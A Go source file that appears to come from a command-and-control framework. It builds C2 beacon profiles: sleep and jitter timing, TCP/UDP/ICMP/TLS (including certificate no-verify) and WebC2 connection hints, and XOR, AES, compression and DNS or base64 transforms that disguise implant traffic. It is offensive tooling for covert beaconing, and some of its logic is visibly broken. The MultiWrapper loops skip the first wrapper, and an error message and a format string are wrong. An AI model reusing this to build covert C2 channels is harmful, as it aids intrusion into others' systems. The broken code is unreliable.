package c2

import (
	"io"
	"strconv"
	"time"

	"github.com/iDigitalFlame/xmt/c2/transform"
	"github.com/iDigitalFlame/xmt/c2/wrapper"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	// DefaultSleep is the default sleep Time when the provided sleep value is empty or negative.
	DefaultSleep = time.Duration(60) * time.Second

	// DefaultJitter is the default Jitter value when the provided jitter value is negative.
	DefaultJitter uint8 = 5

	ipID  byte = 0xA0
	tcpID byte = iota
	udpID
	wc2ID
	tlsID
	hexID
	dnsID
	aesID
	cbkID
	xorID
	sizeID
	zlibID
	gzipID
	sleepID
	jitterID
	base64ID
	base64TID
)

var (
	// WrapHex is a Setting that enables the Hex Wrapper for the generated Profile.
	WrapHex = Setting{hexID}
	// WrapZlib is a Setting that enables the ZLIB Wrapper for the generated Profile.
	WrapZlib = Setting{zlibID}
	// WrapGzip is a Setting that enables the GZIP Wrapper for the generated Profile.
	WrapGzip = Setting{gzipID}
	// WrapBase64 is a Setting that enables the Base64 Wrapper for the generated Profile.
	WrapBase64 = Setting{base64ID}

	// ConnectTCP will provide a TCP connection 'hint' to the generated Profile. Hints will suggest the connection
	// type used if the connection setting in the 'Connect*', 'Oneshot' or 'Listen' functions is nil. If multiple
	// connection hints are contained in a Config, a 'ErrMultipleHints' will be returned.
	ConnectTCP = Setting{tcpID}
	// ConnectTLS will provide a TLS over TCP connection 'hint' to the generated Profile. Hints will suggest the
	// connection type used if the connection setting in the 'Connect*', 'Oneshot' or 'Listen' functions is nil.
	// If multiple connection hints are contained in a Config, a 'ErrMultipleHints' will be returned. This hint
	// cannot be used as a Listener.
	ConnectTLS = Setting{tlsID}
	// ConnectUDP will provide a UCO connection 'hint' to the generated Profile. Hints will suggest the connection
	// type used if the connection setting in the 'Connect*', 'Oneshot' or 'Listen' functions is nil. If multiple
	// connection hints are contained in a Config, a 'ErrMultipleHints' will be returned.
	ConnectUDP = Setting{udpID}
	// ConnectICMP will provide a ICMP connection 'hint' to the generated Profile. Hints will suggest the connection
	// type used if the connection setting in the 'Connect*', 'Oneshot' or 'Listen' functions is nil. If multiple
	// connection hints are contained in a Config, a 'ErrMultipleHints' will be returned.
	ConnectICMP = Setting{ipID, 1}
	// ConnectTLSNoVerify will provide a TLS over TCP connection 'hint' to the generated Profile. Hints will suggest
	// the connection type used if the connection setting in the 'Connect*', 'Oneshot' or 'Listen' functions is nil.
	// If multiple connection hints are contained in a Config, a 'ErrMultipleHints' will be returned. This setting
	// DOES NOT check the server certificate for validity. This hint cannot be used as a Listener.
	ConnectTLSNoVerify = Setting{tlsID, 1}

	// DefaultProfile is an simple profile for use with testing or filling without having to define all the
	// profile properties.
	DefaultProfile = &Profile{Size: uint(limits.MediumLimit()), Sleep: DefaultSleep, Jitter: uint(DefaultJitter)}

	// TransformBase64 is a Setting that enables the Base64 Transform for the generated Profile.
	TransformBase64 = Setting{base64TID}

	// ErrMultipleHints is an error returned by the 'Profile' function if more that one Connection Hint Setting is
	// attempted to be applied by the Config.
	ErrMultipleHints = xerr.New("config attempted to add multiple transforms")
	// ErrInvalidSetting is an error returned by the 'Profile' function if any of the specified Settings are invalid
	// or do contain valid information. The error returned will be a wrapped version of this error.
	ErrInvalidSetting = xerr.New("config setting is invalid")
	// ErrMultipleTransforms is an error returned by the 'Profile' function if more that one Transform Setting is
	// attempted to be applied by the Config. Unlink Wrappers, Transforms cannot be stacked.
	ErrMultipleTransforms = xerr.New("config attempted to add multiple transforms")
)

// Setting is an alias for a byte array that represents a setting in binary form. This can be used inside a
// Config alias to generate a C2 Profile from binary data or write a Profile to a binary stream.
type Setting []byte

// Config is an array of settings that can be transformed into a valid C2 Profile. This alias also allows for
// reading/writing the settings from/into a Reader/Writer stream.
type Config []Setting

// Profile is a struct that represents a C2 profile. This is used for defining the specifics that will
// be used to listen by servers and for connections by clients.  Nil or empty values will be replaced with defaults.
type Profile struct {
	Size      uint
	Sleep     time.Duration
	Jitter    uint
	Wrapper   Wrapper
	Transform Transform

	hint Setting
}

// MultiWrapper is an alias for an array of Wrappers. This will preform the wrapper/unwrapping operations in the
// order of the array. This is automatically created by a Config instance when multiple Wrappers are present.
type MultiWrapper []Wrapper

// Size returns a Setting that will specify the buffer size of the generated Profile. Only sizes greater than zero
// are valid sizes. Otherwise the medium limit setting is used.
func Size(n uint) Setting {
	return Setting{
		sizeID, byte(n >> 56), byte(n >> 48), byte(n >> 40), byte(n >> 32),
		byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n),
	}
}

// Len returns the amount of Settings contained in this Config.
func (c Config) Len() int {
	return len(c)
}

// Jitter returns a Setting that will specify the Jitter setting of the generated Profile. Only Jitter values from
// zero to one-hundred are valid. Other values are ignored and replaced with the default.
func Jitter(n uint) Setting {
	return Setting{jitterID, byte(n)}
}

// ConnectIP will provide a IP connection 'hint' to the generated Profile with the specified protocol number.
// Hints will suggest the connection type used if the connection setting in the 'Connect*', 'Oneshot' or 'Listen'
// functions is nil. If multiple connection hints are contained in a Config, a 'ErrMultipleHints' will be returned.
func ConnectIP(p uint) Setting {
	return Setting{ipID, byte(p)}
}

// WrapXOR returns a Setting that will apply the XOR Wrapper to the generated Profile. The specified key will be
// the XOR key used.
func WrapXOR(k []byte) Setting {
	return Setting(append([]byte{xorID}, k...))
}

// String returns a string representation of this Config.
func (c Config) String() string {
	return "Config[" + strconv.Itoa(len(c)) + " settings]"
}

// String returns a string representation of this Setting.
func (s Setting) String() string {
	if len(s) == 0 {
		return "Empty Setting"
	}
	switch s[0] {
	case ipID:
		if len(s) == 2 {
			return "IP Connection (Proto " + strconv.Itoa(int(s[1])) + ")"
		}
	case tcpID:
		return "TCP Connection"
	case udpID:
		return "UDP Connection"
	case wc2ID:
		return "WC2 Connection"
	case tlsID:
		if len(s) == 2 && s[1] == 1 {
			return "TLS Connection (No Verify)"
		}
		return "TLS Connection"
	case hexID:
		return "Hex Wrapper"
	case dnsID:
		return "DNS Transform"
	case aesID:
		return "AES Wrapper"
	case cbkID:
		return "CBK Wrapper"
	case xorID:
		return "XOR Wrapper"
	case sizeID:
		if len(s) == 9 {
			_ = s[8]
			return "Size " + strconv.Itoa(int(
				uint64(s[8])|uint64(s[7])<<8|uint64(s[6])<<16|uint64(s[5])<<24|
					uint64(s[4])<<32|uint64(s[3])<<40|uint64(s[2])<<48|uint64(s[1])<<56,
			))
		}
	case zlibID:
		if len(s) == 2 {
			return "Zlib Wrapper (Level " + strconv.Itoa(int(s[1])) + ")"
		}
		return "Zlib Wrapper"
	case gzipID:
		if len(s) == 2 {
			return "Gzip Wrapper (Level " + strconv.Itoa(int(s[1])) + ")"
		}
		return "Gzip Wrapper"
	case sleepID:
		if len(s) == 9 {
			_ = s[8]
			return "Sleep " + time.Duration(
				uint64(s[8])|uint64(s[7])<<8|uint64(s[6])<<16|uint64(s[5])<<24|
					uint64(s[4])<<32|uint64(s[3])<<40|uint64(s[2])<<48|uint64(s[1])<<56,
			).String()
		}
	case jitterID:
		if len(s) == 2 {
			return "Jitter " + strconv.Itoa(int(s[1])) + "%"
		}
	case base64ID:
		return "Base64 Wrapper"
	case base64TID:
		if len(s) == 2 {
			return "Base64 Transform (Shifted " + strconv.Itoa(int(s[1])) + ")"
		}
		return "Base64 Transform"
	}
	return "Invalid Setting 0x%X" + strconv.FormatUint(uint64(s[0]), 16)
}

// WrapGzipLevel returns a Setting that will apply the Gzip Wrapper to the generated Profile. The specified level will
// determine the compression level. The 'Profile' function will return an 'ErrInvalidSetting' error if the compression
// level is invalid.
func WrapGzipLevel(l int) Setting {
	return Setting{gzipID, byte(l)}
}

// WrapZlibLevel returns a Setting that will apply the Zlib Wrapper to the generated Profile. The specified level will
// determine the compression level. The 'Profile' function will return an 'ErrInvalidSetting' error if the compression
// level is invalid.
func WrapZlibLevel(l int) Setting {
	return Setting{zlibID, byte(l)}
}

// WrapAES returns a Setting that will apply the AES Wrapper to the generated Profile. The specified key and IV
// will be the AES Key and IV used.
func WrapAES(k, iv []byte) Setting {
	s := []byte{aesID, 0}
	if len(k) > 255 {
		s[1] = 255
		s = append(s, k[:255]...)
	} else {
		s[1] = byte(len(k))
		s = append(s, k...)
	}
	if len(iv) > 255 {
		s = append(s, iv[:255]...)
	} else {
		s = append(s, iv...)
	}
	return Setting(s)
}

// Sleep returns a Setting that will specify the Sleep timeout setting of the generated Profile. Values
// of zero are ignored.
func Sleep(t time.Duration) Setting {
	return Setting{
		sleepID, byte(t >> 56), byte(t >> 48), byte(t >> 40), byte(t >> 32),
		byte(t >> 24), byte(t >> 16), byte(t >> 8), byte(t),
	}
}

// WrapCBK returns a Setting that will apply the CBK Wrapper to the generated Profile. The specified ABC and Type
// values are the CBK letters used. To specify the CBK buffer size, use the 'WrapCBKSize' function instead.
func WrapCBK(a, b, c, d byte) Setting {
	return WrapCBKSize(16, a, b, c, d)
}

// Add will append the specified Setting to the end of this Config array. This function also returns the Config array
// for convenience and easy chained use.
func (c Config) Add(s Setting) Config {
	if len(s) == 0 {
		return c
	}
	c = append(c, s)
	return c
}

// TransformDNS returns a Setting that will apply the DNS Transform to the generated Profile. If any DNS Domains
// are specified, they will be used in the Transform. If a Transform Setting is already contained in the parent
// Config, a 'ErrMultipleTransforms' error will be returned when the 'Profile' function is called.
func TransformDNS(n ...string) Setting {
	s := []byte{dnsID, 0}
	if len(s) == 0 {
		return Setting(s)
	}
	if len(n) > 255 {
		s[1] = 255
	} else {
		s[1] = byte(len(n))
	}
	for i, c, v := 0, 2, ""; i < len(n) && i < 255; i++ {
		v = n[i]
		if len(v) > 255 {
			v = v[:255]
		}
		s = append(s, make([]byte, len(v)+1)...)
		s[c] = byte(len(v))
		c += copy(s[c+1:], v) + 1
	}
	return Setting(s)
}

// Read reads the data from the supplied Reader into this Config instance.
func (c *Config) Read(r io.Reader) error {
	b := make([]byte, 2)
	if _, err := r.Read(b); err != nil {
		return err
	}
	l := uint16(b[1]) | uint16(b[0])<<8
	*c = make([]Setting, l)
	for i := uint16(0); i < l; i++ {
		if err := (*c)[i].read(b, r); err != nil {
			return err
		}
	}
	return nil
}

// Write writes this Config to a supplied io.Writer.
func (c Config) Write(w io.Writer) error {
	if len(c) == 0 {
		return nil
	}
	if _, err := w.Write([]byte{byte(len(c) >> 8), byte(len(c))}); err != nil {
		return err
	}
	for i := range c {
		if err := c[i].write(w); err != nil {
			return err
		}
	}
	return nil
}

// TransformBase64Shift returns a Setting that will apply the Base64 Shift Transform to the generated Profile.
// The specified number will be the shift index of the Transform. If a Transform Setting is already contained
// in the parent Config, a 'ErrMultipleTransforms' error will be returned when the 'Profile' function is called.
func TransformBase64Shift(s int) Setting {
	return Setting{base64TID, byte(s)}
}
func (s Setting) write(w io.Writer) error {
	if _, err := w.Write([]byte{byte(len(s) >> 8), byte(len(s))}); err != nil {
		return err
	}
	_, err := w.Write([]byte(s))
	return err
}

// Profile attempts to build a C2 Profile based on the Settings contained in this Config. This function will return
// 'ErrInvalidSetting' if any of the Settings contain invalid values, 'ErrMultipleTransforms' if multiple Transforms
// are contained in this Config or 'ErrMultipleHints' if multiple connection hints are contained in this Config.
func (c Config) Profile() (*Profile, error) {
	var (
		p Profile
		w []Wrapper
	)
	for i := range c {
		if len(c[i]) == 0 {
			continue
		}
		switch c[i][0] {
		case wc2ID:
			if len(c[i]) < 4 {
				return nil, xerr.Wrap("WebC2 hint requires rule values", ErrInvalidSetting)
			}
			fallthrough
		case ipID:
			if len(c[i]) != 2 && c[i][0] == ipID {
				return nil, xerr.Wrap("IP hint requires two values", ErrInvalidSetting)
			}
			fallthrough
		case tcpID, udpID, tlsID:
			if p.hint != nil {
				return nil, ErrMultipleHints
			}
			p.hint = c[i]
		case hexID:
			w = append(w, wrapper.Hex)
		case dnsID:
			if p.Transform != nil {
				return nil, ErrMultipleTransforms
			}
			var d []string
			if len(c[i]) > 2 && c[i][2] > 0 {
				for n, x, y := 2, c[i][1], 0; x > 0; x-- {
					y = int(c[i][n])
					if y <= 0 {
						continue
					}
					d = append(d, string(c[i][n+1:n+y+1]))
					n += y + 1
				}
			}
			p.Transform = &transform.DNSClient{Domains: d}
		case aesID:
			if len(c[i]) < 2 {
				return nil, xerr.Wrap("AES requires a key", ErrInvalidSetting)
			}
			var (
				l = c[i][1]
				k = c[i][2 : 2+l]
			)
			x, err := crypto.NewAes(k)
			if err != nil {
				return nil, xerr.Wrap(err.Error(), ErrInvalidSetting)
			}
			y, err := wrapper.NewBlock(x, c[i][2+l:])
			if err != nil {
				return nil, xerr.Wrap(err.Error(), ErrInvalidSetting)
			}
			w = append(w, y)
		case cbkID:
			if len(c[i]) != 6 {
				return nil, xerr.Wrap("CBK requires a key", ErrInvalidSetting)
			}
			_ = c[i][5]
			x, err := crypto.NewCBKEx(int(c[i][5]), int(c[i][1]), nil)
			if err != nil {
				return nil, xerr.Wrap(err.Error(), ErrInvalidSetting)
			}
			y, _ := crypto.NewCBKEx(int(c[i][5]), int(c[i][1]), nil)
			x.A, y.A = c[i][2], c[i][2]
			x.B, y.B = c[i][3], c[i][3]
			x.C, y.C = c[i][4], c[i][4]
			z, _ := wrapper.NewCrypto(x, y)
			w = append(w, z)
		case xorID:
			if len(c[i]) < 2 {
				return nil, xerr.Wrap("XOR requires a key", ErrInvalidSetting)
			}
			x := crypto.XOR(c[i][1:])
			z, _ := wrapper.NewCrypto(x, x)
			w = append(w, z)
		case sizeID:
			if len(c[i]) != 9 {
				return nil, xerr.Wrap("size requires two values", ErrInvalidSetting)
			}
			_ = c[i][8]
			p.Size = uint(
				uint64(c[i][8]) | uint64(c[i][7])<<8 | uint64(c[i][6])<<16 | uint64(c[i][5])<<24 |
					uint64(c[i][4])<<32 | uint64(c[i][3])<<40 | uint64(c[i][2])<<48 | uint64(c[i][1])<<56,
			)
		case zlibID:
			if len(c[i]) == 2 {
				z, err := wrapper.NewZlib(int(c[i][1]))
				if err != nil {
					return nil, xerr.Wrap(err.Error(), ErrInvalidSetting)
				}
				w = append(w, z)
				continue
			}
			w = append(w, wrapper.Zlib)
		case gzipID:
			if len(c[i]) == 2 {
				g, err := wrapper.NewGzip(int(c[i][1]))
				if err != nil {
					return nil, xerr.Wrap(err.Error(), ErrInvalidSetting)
				}
				w = append(w, g)
				continue
			}
			w = append(w, wrapper.Gzip)
		case sleepID:
			if len(c[i]) != 9 {
				return nil, xerr.Wrap("sleep requires two values", ErrInvalidSetting)
			}
			_ = c[i][8]
			p.Sleep = time.Duration(
				uint64(c[i][8]) | uint64(c[i][7])<<8 | uint64(c[i][6])<<16 | uint64(c[i][5])<<24 |
					uint64(c[i][4])<<32 | uint64(c[i][3])<<40 | uint64(c[i][2])<<48 | uint64(c[i][1])<<56,
			)
		case jitterID:
			if len(c[i]) != 2 {
				return nil, xerr.Wrap("jitter requires two values", ErrInvalidSetting)
			}
			p.Jitter = uint(c[i][1])
		case base64ID:
			w = append(w, wrapper.Base64)
		case base64TID:
			if p.Transform != nil {
				return nil, ErrMultipleTransforms
			}
			if len(c[i]) == 2 {
				p.Transform = transform.Base64Shift(int(c[i][1]))
				continue
			}
			p.Transform = transform.Base64
		default:
			return nil, xerr.Wrap("unknown setting value 0x"+strconv.FormatUint(uint64(c[i][0]), 16), ErrInvalidSetting)
		}
	}
	if len(w) > 1 {
		p.Wrapper = MultiWrapper(w)
	} else if len(w) == 1 {
		p.Wrapper = w[0]
	}
	return &p, nil
}

// WrapCBKSize returns a Setting that will apply the CBK Wrapper to the generated Profile. The specified size, ABC
// and Type values are the CBK size and letters used.
func WrapCBKSize(s, a, b, c, d byte) Setting {
	return Setting{cbkID, s, a, b, c, d}
}

// ConnectWC2 will provide a WebC2 connection 'hint' to the generated Profile with the specified User-Agent, URL and
// Host Matcher strings (strings can be empty). Hints will suggest the connection type used if the connection setting
// in the 'Connect*', 'Oneshot' or 'Listen' functions is nil. If multiple connection hints are contained in a Config,
// a 'ErrMultipleHints' will be returned. This hint cannot be used as a Listener.
func ConnectWC2(url, agent, host string) Setting {
	var a, u, h = agent, url, host
	if len(h) > 255 {
		h = h[:255]
	}
	if uint64(len(a)) > data.DataLimitMedium {
		a = a[:data.DataLimitMedium]
	}
	if uint64(len(u)) > data.DataLimitMedium {
		u = u[:data.DataLimitMedium]
	}
	s := Setting{wc2ID, byte(len(a) >> 8), byte(len(a)), byte(len(u) >> 8), byte(len(u)), byte(len(h))}
	s = append(s, make([]byte, len(a)+len(u)+len(h))...)
	v := copy(s[6:], a)
	v += copy(s[6+v:], u)
	copy(s[6+v:], h)
	return s
}

// MarshalStream transforms this Config into a binary format and writes to the supplied data.Writer.
func (c Config) MarshalStream(w data.Writer) error {
	return c.Write(w)
}
func (s *Setting) read(b []byte, r io.Reader) error {
	if _, err := r.Read(b); err != nil {
		return err
	}
	l := uint16(b[1]) | uint16(b[0])<<8
	*s = make([]byte, l)
	if _, err := r.Read(*s); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream transforms this Config from a binary format that is read from the supplied data.Reader.
func (c *Config) UnmarshalStream(r data.Reader) error {
	return c.Read(r)
}

// Wrap satisfies the Wrapper interface.
func (m MultiWrapper) Wrap(w io.WriteCloser) (io.WriteCloser, error) {
	var (
		o   = w
		err error
	)
	for x := len(m) - 1; x > 0; x-- {
		if o, err = m[x].Wrap(o); err != nil {
			return nil, err
		}
	}
	return o, nil
}

// Unwrap satisfies the Wrapper interface.
func (m MultiWrapper) Unwrap(r io.ReadCloser) (io.ReadCloser, error) {
	var (
		o   = r
		err error
	)
	for x := len(m) - 1; x > 0; x-- {
		if o, err = m[x].Unwrap(o); err != nil {
			return nil, err
		}
	}
	return o, nil
}
